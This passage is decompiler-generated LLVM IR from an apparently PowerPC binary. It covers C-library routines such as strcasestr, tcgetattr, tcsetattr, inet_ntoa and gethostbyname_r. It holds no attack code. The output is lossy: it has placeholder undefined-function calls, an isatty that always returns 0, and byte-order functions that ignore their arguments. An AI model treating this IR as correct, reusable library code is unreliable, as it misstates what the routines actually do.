dec_label_pc_1000d8a0:                            ; preds = %dec_label_pc_1000d878, %dec_label_pc_1000d880
  %v0_1000d8b47 = phi i32 [ %v2_1000d898, %dec_label_pc_1000d880 ], [ %v0_1000d8b46, %dec_label_pc_1000d878 ]
  %v2_1000d8a0 = load i8, i8* %.pre, align 1
  %v1_1000d8a4 = add i32 %v0_1000d8a4, 1
  %v1_1000d8a8 = add i32 %v0_1000d8a8, 1
  %v3_1000d8ac = icmp eq i8 %v2_1000d8a0, 0
  br i1 %v3_1000d8ac, label %dec_label_pc_1000d8b4, label %dec_label_pc_1000d878

dec_label_pc_1000d8b4:                            ; preds = %dec_label_pc_1000d8a0, %dec_label_pc_1000d880
  %v0_1000d8b4 = phi i32 [ %v0_1000d8b47, %dec_label_pc_1000d8a0 ], [ %v2_1000d898, %dec_label_pc_1000d880 ]
  ret i32 %v0_1000d8b4

; uselistorder directives
  uselistorder i32 %v2_1000d898, { 1, 0 }
  uselistorder i32 %v0_1000d8a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d8a0, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1000d8c4 = load i32, i32* bitcast (i32** @global_var_1002e5e4.864 to i32*), align 4
  store i32 %v3_1000d8c4, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d8cc

dec_label_pc_1000d8cc:                            ; preds = %dec_label_pc_1000d8cc.backedge, %entry
  %v0_1000d8cc = phi i32 [ %v0_1000d8cc.pre, %dec_label_pc_1000d8cc.backedge ], [ %arg2, %entry ]
  %v1_1000d8cc = inttoptr i32 %v0_1000d8cc to i8*
  %v2_1000d8cc = load i8, i8* %v1_1000d8cc, align 1
  %v3_1000d8cc = zext i8 %v2_1000d8cc to i32
  store i32 %v3_1000d8cc, i32* %r0.global-to-local, align 4
  %v1_1000d8d0 = add i32 %v0_1000d8cc, 1
  store i32 %v1_1000d8d0, i32* %r10.global-to-local, align 4
  %v3_1000d8d4 = icmp eq i8 %v2_1000d8cc, 0
  %v1_1000d8d8 = mul nuw nsw i32 %v3_1000d8cc, 2
  store i32 %v1_1000d8d8, i32* %r9.global-to-local, align 4
  %v0_1000d8dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d8d4, i32 %v0_1000d8dc)
  %v0_1000d8e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d8e0 = inttoptr i32 %v0_1000d8e0 to i8*
  %v2_1000d8e0 = load i8, i8* %v1_1000d8e0, align 1
  %v3_1000d8e0 = zext i8 %v2_1000d8e0 to i32
  %v1_1000d8e4 = add i32 %v0_1000d8e0, 1
  store i32 %v1_1000d8e4, i32* %r8.global-to-local, align 4
  %v0_1000d8e8 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000d8e8 = icmp eq i32 %v0_1000d8e8, %v3_1000d8e0
  br i1 %v4_1000d8e8, label %dec_label_pc_1000d8cc.backedge, label %dec_label_pc_1000d8f4

dec_label_pc_1000d8cc.backedge:                   ; preds = %dec_label_pc_1000d8cc, %dec_label_pc_1000d8f4, %dec_label_pc_1000d908
  %v0_1000d8cc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d8cc

dec_label_pc_1000d8f4:                            ; preds = %dec_label_pc_1000d8cc
  %v1_1000d8ec = mul nuw nsw i32 %v3_1000d8e0, 2
  %v0_1000d8f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d8f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000d8f4 = add i32 %v1_1000d8f4, %v0_1000d8f4
  %v3_1000d8f4 = inttoptr i32 %v2_1000d8f4 to i16*
  %v4_1000d8f4 = load i16, i16* %v3_1000d8f4, align 2
  %v5_1000d8f4 = sext i16 %v4_1000d8f4 to i32
  store i32 %v5_1000d8f4, i32* %r9.global-to-local, align 4
  %v2_1000d8fc = add i32 %v1_1000d8f4, %v1_1000d8ec
  %v3_1000d8fc = inttoptr i32 %v2_1000d8fc to i16*
  %v4_1000d8fc = load i16, i16* %v3_1000d8fc, align 2
  %v5_1000d8fc = sext i16 %v4_1000d8fc to i32
  store i32 %v5_1000d8fc, i32* %r0.global-to-local, align 4
  %v4_1000d900 = icmp eq i16 %v4_1000d8f4, %v4_1000d8fc
  br i1 %v4_1000d900, label %dec_label_pc_1000d8cc.backedge, label %dec_label_pc_1000d908

dec_label_pc_1000d908:                            ; preds = %dec_label_pc_1000d8f4
  %v3_1000d8f8 = icmp eq i8 %v2_1000d8e0, 0
  %v0_1000d908 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000d908 = add i32 %v0_1000d908, 1
  store i32 %v1_1000d908, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r10.global-to-local, align 4
  store i32 %v1_1000d908, i32* %r8.global-to-local, align 4
  br i1 %v3_1000d8f8, label %dec_label_pc_1000d918, label %dec_label_pc_1000d8cc.backedge

dec_label_pc_1000d918:                            ; preds = %dec_label_pc_1000d908
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000d8cc, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d8cc.backedge, { 2, 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002e628.865 to i32), i32* @r5, align 4
  %v1_1000d928 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1002e628.865 to i32))
  ret i32 %v1_1000d928
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268491072, i32* @lr, align 4
  %v2_1000d93c = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000d95c = load i32, i32* @lr, align 4
  store i32 %v0_1000d95c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000d96c = ptrtoint i32* %stack_var_-56 to i32
  store i32 268491136, i32* @lr, align 4
  %v3_1000d97c = call i32 @ioctl(i32 1076655123, i32 %v2_1000d96c, i32 %v2_1000d96c)
  %v2_1000d980 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000d980, i32* @r4, align 4
  store i32 %v3_1000d97c, i32* @r30, align 4
  %v3_1000d984 = icmp eq i32 %v3_1000d97c, 0
  store i32 19, i32* @r5, align 4
  %v0_1000d98c = load i32, i32* @r31, align 4
  br i1 %v3_1000d984, label %dec_label_pc_1000d994, label %dec_label_pc_1000d9dc

dec_label_pc_1000d994:                            ; preds = %entry
  %v1_1000d98c = add i32 %v0_1000d98c, 17
  %v4_1000d9a0 = zext i8 %tmp4 to i32
  store i32 %v4_1000d9a0, i32* @r8, align 4
  %v3_1000d9ac = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000d9ac, i32* %r0.global-to-local, align 4
  %v2_1000d9b0 = add i32 %v0_1000d98c, 4
  %v3_1000d9b0 = inttoptr i32 %v2_1000d9b0 to i32*
  store i32 %tmp7, i32* %v3_1000d9b0, align 4
  %v0_1000d9b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d9b4 = load i32, i32* @r31, align 4
  %v2_1000d9b4 = inttoptr i32 %v1_1000d9b4 to i32*
  store i32 %v0_1000d9b4, i32* %v2_1000d9b4, align 4
  %v0_1000d9b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d9b8 = load i32, i32* @r31, align 4
  %v2_1000d9b8 = add i32 %v1_1000d9b8, 8
  %v3_1000d9b8 = inttoptr i32 %v2_1000d9b8 to i32*
  store i32 %v0_1000d9b8, i32* %v3_1000d9b8, align 4
  %v0_1000d9bc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d9bc = load i32, i32* @r31, align 4
  %v2_1000d9bc = add i32 %v1_1000d9bc, 12
  %v3_1000d9bc = inttoptr i32 %v2_1000d9bc to i32*
  store i32 %v0_1000d9bc, i32* %v3_1000d9bc, align 4
  %v3_1000d9c0 = load i32, i32* @r31, align 4
  %v4_1000d9c0 = add i32 %v3_1000d9c0, 16
  %v5_1000d9c0 = inttoptr i32 %v4_1000d9c0 to i8*
  store i8 %tmp4, i8* %v5_1000d9c0, align 1
  %v1_1000d9c4 = load i32, i32* @r31, align 4
  %v2_1000d9c4 = add i32 %v1_1000d9c4, 52
  %v3_1000d9c4 = inttoptr i32 %v2_1000d9c4 to i32*
  store i32 %tmp3, i32* %v3_1000d9c4, align 4
  %v1_1000d9c8 = load i32, i32* @r31, align 4
  %v2_1000d9c8 = add i32 %v1_1000d9c8, 56
  %v3_1000d9c8 = inttoptr i32 %v2_1000d9c8 to i32*
  store i32 %tmp2, i32* %v3_1000d9c8, align 4
  store i32 268491216, i32* @lr, align 4
  %v6_1000d9cc = sext i8 %tmp4 to i32
  %v8_1000d9cc = call i32 @__GI_mempcpy(i32 %v1_1000d98c, i32 %v2_1000d980, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000d9cc, i32 %tmp7)
  store i32 268491228, i32* @lr, align 4
  %v3_1000d9d8 = call i32 @__GI_memset(i32 %v8_1000d9cc, i32 0, i32 13)
  %v0_1000d9e0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d9dc

dec_label_pc_1000d9dc:                            ; preds = %entry, %dec_label_pc_1000d994
  %v0_1000d9e0 = phi i32 [ %v3_1000d97c, %entry ], [ %v0_1000d9e0.pre, %dec_label_pc_1000d994 ]
  store i32 %v0_1000d95c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d9e0

; uselistorder directives
  uselistorder i32 %v2_1000d96c, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d9dc, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000d9f4 = load i32, i32* @r4, align 4
  %v3_1000d9f4 = icmp eq i32 %v0_1000d9f4, 1
  %v0_1000da04 = load i32, i32* @r3, align 4
  store i32 %v0_1000da04, i32* @r27, align 4
  %v0_1000da0c = load i32, i32* @r5, align 4
  store i32 %v0_1000da0c, i32* @r31, align 4
  br i1 %v3_1000d9f4, label %dec_label_pc_1000da30, label %dec_label_pc_1000da14

dec_label_pc_1000da14:                            ; preds = %entry
  %v3_1000da14 = icmp eq i32 %v0_1000d9f4, 2
  br i1 %v3_1000da14, label %dec_label_pc_1000da50, label %dec_label_pc_1000da1c

dec_label_pc_1000da1c:                            ; preds = %dec_label_pc_1000da14
  %v3_1000da1c = icmp eq i32 %v0_1000d9f4, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000da1c, label %dec_label_pc_1000da58, label %dec_label_pc_1000da3c

dec_label_pc_1000da30:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000da58

dec_label_pc_1000da3c:                            ; preds = %dec_label_pc_1000da1c
  %v0_1000da3c = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_1000da48 = inttoptr i32 %v0_1000da3c to i32*
  store i32 22, i32* %v2_1000da48, align 4
  br label %dec_label_pc_1000db40

dec_label_pc_1000da50:                            ; preds = %dec_label_pc_1000da14
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000da58

dec_label_pc_1000da58:                            ; preds = %dec_label_pc_1000da1c, %dec_label_pc_1000da30, %dec_label_pc_1000da50
  %v1_1000da58 = inttoptr i32 %v0_1000da0c to i32*
  %v2_1000da58 = load i32, i32* %v1_1000da58, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000da60 = add i32 %v0_1000da0c, 4
  %v2_1000da60 = inttoptr i32 %v1_1000da60 to i32*
  %v3_1000da60 = load i32, i32* %v2_1000da60, align 4
  store i32 %v3_1000da60, i32* %r9.global-to-local, align 4
  %v1_1000da64 = add i32 %v0_1000da0c, 17
  store i32 %v1_1000da64, i32* @r4, align 4
  %v1_1000da68 = add i32 %v0_1000da0c, 8
  %v2_1000da68 = inttoptr i32 %v1_1000da68 to i32*
  %v3_1000da68 = load i32, i32* %v2_1000da68, align 4
  %v2_1000da6c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000da6c, i32* @r3, align 4
  %v2_1000da74 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000da74, i32* @r26, align 4
  %v1_1000da78 = add i32 %v0_1000da0c, 16
  %v2_1000da78 = inttoptr i32 %v1_1000da78 to i8*
  %v3_1000da78 = load i8, i8* %v2_1000da78, align 1
  %v4_1000da78 = zext i8 %v3_1000da78 to i32
  store i32 %v4_1000da78, i32* @r8, align 4
  store i32 %v2_1000da58, i32* %stack_var_-72, align 4
  store i32 268491428, i32* @lr, align 4
  %v0_1000daa0 = call i32 @memcpy()
  %v0_1000daa4 = load i32, i32* @r27, align 4
  %v0_1000daa8 = load i32, i32* @r30, align 4
  store i32 268491448, i32* @lr, align 4
  %v3_1000dab4 = call i32 @ioctl(i32 %v0_1000daa4, i32 %v0_1000daa8, i32 %v2_1000da74)
  store i32 %v3_1000dab4, i32* @r28, align 4
  %v3_1000dab8 = icmp eq i32 %v3_1000dab4, 0
  br i1 %v3_1000dab8, label %dec_label_pc_1000dac0, label %dec_label_pc_1000db40

dec_label_pc_1000dac0:                            ; preds = %dec_label_pc_1000da58
  %v0_1000dac0 = load i32, i32* @r30, align 4
  %v3_1000dac4 = icmp eq i32 %v0_1000dac0, -2144570348
  br i1 %v3_1000dac4, label %dec_label_pc_1000dacc, label %dec_label_pc_1000db3c

dec_label_pc_1000dacc:                            ; preds = %dec_label_pc_1000dac0
  %v0_1000dacc = call i32 @__errno_location()
  store i32 %v0_1000dacc, i32* @r29, align 4
  %v0_1000dadc = load i32, i32* @r27, align 4
  %v1_1000dae4 = inttoptr i32 %v0_1000dacc to i32*
  %v2_1000dae4 = load i32, i32* %v1_1000dae4, align 4
  store i32 %v2_1000dae4, i32* @r30, align 4
  store i32 268491504, i32* @lr, align 4
  %v3_1000daec = call i32 @ioctl(i32 %v0_1000dadc, i32 1076655123, i32 %v2_1000da74)
  %v3_1000daf0 = icmp eq i32 %v3_1000daec, 0
  br i1 %v3_1000daf0, label %dec_label_pc_1000db00, label %dec_label_pc_1000daf8

dec_label_pc_1000daf8:                            ; preds = %dec_label_pc_1000dacc
  %v0_1000daf8 = load i32, i32* @r30, align 4
  %v1_1000daf8 = load i32, i32* @r29, align 4
  %v2_1000daf8 = inttoptr i32 %v1_1000daf8 to i32*
  store i32 %v0_1000daf8, i32* %v2_1000daf8, align 4
  br label %dec_label_pc_1000db40

dec_label_pc_1000db00:                            ; preds = %dec_label_pc_1000dacc
  %v0_1000db00 = load i32, i32* @r31, align 4
  %v1_1000db00 = add i32 %v0_1000db00, 8
  %v2_1000db00 = inttoptr i32 %v1_1000db00 to i32*
  %v3_1000db00 = load i32, i32* %v2_1000db00, align 4
  %v1_1000db08 = call i32 @__asm_rlwinm(i32 %v3_1000db00, i32 0, i32 19, i32 20)
  %v1_1000db0c = call i32 @__asm_rlwinm(i32 %v3_1000da68, i32 0, i32 19, i32 20)
  store i32 %v1_1000db0c, i32* %r9.global-to-local, align 4
  %v4_1000db10 = icmp eq i32 %v1_1000db08, %v1_1000db0c
  br i1 %v4_1000db10, label %dec_label_pc_1000db18, label %dec_label_pc_1000db2c

dec_label_pc_1000db18:                            ; preds = %dec_label_pc_1000db00
  %v1_1000db18 = and i32 %v3_1000db00, 768
  store i32 %v1_1000db18, i32* %r9.global-to-local, align 4
  %v3_1000db18 = icmp eq i32 %v1_1000db18, 0
  br i1 %v3_1000db18, label %dec_label_pc_1000db3c, label %dec_label_pc_1000db20

dec_label_pc_1000db20:                            ; preds = %dec_label_pc_1000db18
  %v1_1000db20 = call i32 @__asm_rlwinm(i32 %v3_1000da68, i32 0, i32 22, i32 23)
  %v0_1000db24 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000db24 = icmp eq i32 %v0_1000db24, %v1_1000db20
  br i1 %v4_1000db24, label %dec_label_pc_1000db3c, label %dec_label_pc_1000db2c

dec_label_pc_1000db2c:                            ; preds = %dec_label_pc_1000db00, %dec_label_pc_1000db20
  store i32 -1, i32* @r28, align 4
  %v1_1000db34 = load i32, i32* @r29, align 4
  %v2_1000db34 = inttoptr i32 %v1_1000db34 to i32*
  store i32 22, i32* %v2_1000db34, align 4
  br label %dec_label_pc_1000db40

dec_label_pc_1000db3c:                            ; preds = %dec_label_pc_1000dac0, %dec_label_pc_1000db20, %dec_label_pc_1000db18
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000db40

dec_label_pc_1000db40:                            ; preds = %dec_label_pc_1000da58, %dec_label_pc_1000daf8, %dec_label_pc_1000da3c, %dec_label_pc_1000db2c, %dec_label_pc_1000db3c
  %v0_1000db44 = load i32, i32* @r28, align 4
  ret i32 %v0_1000db44

; uselistorder directives
  uselistorder i32 %v0_1000da0c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000db40, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000db3c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000db2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000da58, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000db58 = load i32, i32* @r3, align 4
  ret i32 %v0_1000db58
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000db5c = load i32, i32* @r3, align 4
  ret i32 %v0_1000db5c
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000db60 = load i32, i32* @r3, align 4
  ret i32 %v0_1000db60
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000db64 = load i32, i32* @r3, align 4
  ret i32 %v0_1000db64
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000db70 = add i32 %arg2, 15
  store i32 %v1_1000db70, i32* %r4.global-to-local, align 4
  %v2_1000db84 = load i32, i32* %arg1, align 4
  store i32 %v2_1000db84, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000db8c

dec_label_pc_1000db8c:                            ; preds = %dec_label_pc_1000dbb0.dec_label_pc_1000db8c_crit_edge, %entry
  %v0_1000db8c = phi i32 [ %v2_1000db84, %entry ], [ %v0_1000db8c.pre, %dec_label_pc_1000dbb0.dec_label_pc_1000db8c_crit_edge ]
  %v0_1000dbd08 = phi i32 [ %v1_1000db70, %entry ], [ %v0_1000dbb0, %dec_label_pc_1000dbb0.dec_label_pc_1000db8c_crit_edge ]
  %v1_1000db8c = urem i32 %v0_1000db8c, 256
  %v5_1000db94 = inttoptr i32 %v0_1000dbd08 to i8*
  %v6_1000db94 = call i32 @_uintmaxtostr(i8* %v5_1000db94, i32 0, i32 %v1_1000db8c, i32 -10, i32 0)
  %v0_1000db98 = load i32, i32* @r30, align 4
  %v3_1000db98 = icmp eq i32 %v0_1000db98, 0
  %v0_1000db9c = load i32, i32* @r31, align 4
  %v1_1000db9c = udiv i32 %v0_1000db9c, 256
  store i32 %v1_1000db9c, i32* %r31.global-to-local, align 4
  %v1_1000dba0 = add i32 %v6_1000db94, -1
  store i32 %v1_1000dba0, i32* %r4.global-to-local, align 4
  br i1 %v3_1000db98, label %dec_label_pc_1000dbb0, label %dec_label_pc_1000dba8

dec_label_pc_1000dba8:                            ; preds = %dec_label_pc_1000db8c
  %v3_1000dbac = inttoptr i32 %v0_1000db98 to i8*
  store i8 46, i8* %v3_1000dbac, align 1
  %v0_1000dbb0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dbb0

dec_label_pc_1000dbb0:                            ; preds = %dec_label_pc_1000db8c, %dec_label_pc_1000dba8
  %v0_1000dbb0 = phi i32 [ %v1_1000dba0, %dec_label_pc_1000db8c ], [ %v0_1000dbb0.pre, %dec_label_pc_1000dba8 ]
  %v0_1000dbb4.pre = load i32, i32* @r29, align 4
  %v1_1000dbc4 = add i32 %v0_1000dbb4.pre, 1
  store i32 %v1_1000dbc4, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000dbb4.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000dbb0.dec_label_pc_1000db8c_crit_edge, label %dec_label_pc_1000dbcc

dec_label_pc_1000dbb0.dec_label_pc_1000db8c_crit_edge: ; preds = %dec_label_pc_1000dbb0
  %v0_1000db8c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000db8c

dec_label_pc_1000dbcc:                            ; preds = %dec_label_pc_1000dbb0
  %v1_1000dbd0 = add i32 %v0_1000dbb0, 1
  ret i32 %v1_1000dbd0

; uselistorder directives
  uselistorder i32 %v0_1000dbb4.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000dbb0, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000dbf8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000dbf8, i32* %stack_var_-8, align 4
  store i32 268491784, i32* @lr, align 4
  %v3_1000dc04 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_10034688.866 to i32))
  ret i32 %v3_1000dc04
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000dc20 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000dc20, i32* @r4, align 4
  store i32 268491820, i32* @lr, align 4
  %v1_1000dc28 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000dc28 = call i32 @inet_aton(i8* %v1_1000dc28)
  %v3_1000dc2c = icmp eq i32 %v2_1000dc28, 0
  br i1 %v3_1000dc2c, label %dec_label_pc_1000dc3c, label %dec_label_pc_1000dc38

dec_label_pc_1000dc38:                            ; preds = %entry
  %v3_1000dc38 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000dc3c

dec_label_pc_1000dc3c:                            ; preds = %entry, %dec_label_pc_1000dc38
  %v0_1000dc48 = phi i32 [ -1, %entry ], [ %v3_1000dc38, %dec_label_pc_1000dc38 ]
  ret i32 %v0_1000dc48

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000dc3c, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000dc60 = call i32 @__GI___h_errno_location()
  %v2_1000dc70 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268491912, i32* @lr, align 4
  %v7_1000dc84 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_10034864.867, i32 ptrtoint (i32* @global_var_10034698.868 to i32), i32 460, i32 %v2_1000dc70, i32 %v0_1000dc60)
  %v3_1000dc8c = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000dc8c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000dca4 = load i32, i32* @lr, align 4
  store i32 %v0_1000dca4, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000dcac = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000dccc = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000dccc, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000dcac, label %dec_label_pc_1000dfd0, label %dec_label_pc_1000dcd8

dec_label_pc_1000dcd8:                            ; preds = %entry
  %v0_1000dcd8 = call i32 @__errno_location()
  store i32 %v0_1000dcd8, i32* %r3.global-to-local, align 4
  %v1_1000dce0 = inttoptr i32 %v0_1000dcd8 to i32*
  %v2_1000dce0 = load i32, i32* %v1_1000dce0, align 4
  store i32 %v2_1000dce0, i32* @r27, align 4
  store i32 %v0_1000dcd8, i32* %r28.global-to-local, align 4
  %v0_1000dce8 = load i32, i32* @r31, align 4
  store i32 %v0_1000dce8, i32* %v1_1000dce0, align 4
  %v0_1000dcec = load i32, i32* %r26.global-to-local, align 4
  %v0_1000dcf0 = load i32, i32* @r23, align 4
  store i32 %v0_1000dcf0, i32* %r3.global-to-local, align 4
  %v0_1000dcf4 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000dcf8 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000dcfc = load i32, i32* %r20.global-to-local, align 4
  %v0_1000dd00 = load i32, i32* @r24, align 4
  store i32 268492040, i32* @lr, align 4
  %v7_1000dd04 = call i32 @__get_hosts_byname_r(i32 %v0_1000dcf0, i32 2, i32 %v0_1000dcec, i32 %v0_1000dcf4, i32 %v0_1000dcf8, i32 %v0_1000dcfc, i32 %v0_1000dd00)
  store i32 %v7_1000dd04, i32* %r3.global-to-local, align 4
  %v3_1000dd08 = icmp eq i32 %v7_1000dd04, 0
  br i1 %v3_1000dd08, label %dec_label_pc_1000dfd0, label %dec_label_pc_1000dd10

dec_label_pc_1000dd10:                            ; preds = %dec_label_pc_1000dcd8
  %v0_1000dd10 = load i32, i32* @r24, align 4
  %v1_1000dd10 = inttoptr i32 %v0_1000dd10 to i32*
  %v2_1000dd10 = load i32, i32* %v1_1000dd10, align 4
  store i32 %v2_1000dd10, i32* %r0.global-to-local, align 4
  %v3_1000dd14 = icmp eq i32 %v2_1000dd10, 1
  br i1 %v3_1000dd14, label %dec_label_pc_1000dd38, label %dec_label_pc_1000dd1c

dec_label_pc_1000dd1c:                            ; preds = %dec_label_pc_1000dd10
  %v3_1000dd1c = icmp eq i32 %v2_1000dd10, 4
  br i1 %v3_1000dd1c, label %dec_label_pc_1000dd38, label %dec_label_pc_1000dd24

dec_label_pc_1000dd24:                            ; preds = %dec_label_pc_1000dd1c
  %v3_1000dd24 = icmp eq i32 %v2_1000dd10, -1
  br i1 %v3_1000dd24, label %dec_label_pc_1000dd2c, label %dec_label_pc_1000dfd0

dec_label_pc_1000dd2c:                            ; preds = %dec_label_pc_1000dd24
  %v0_1000dd2c = load i32, i32* @r28, align 4
  %v1_1000dd2c = inttoptr i32 %v0_1000dd2c to i32*
  %v2_1000dd2c = load i32, i32* %v1_1000dd2c, align 4
  store i32 %v2_1000dd2c, i32* %r0.global-to-local, align 4
  %v3_1000dd30 = icmp eq i32 %v2_1000dd2c, 2
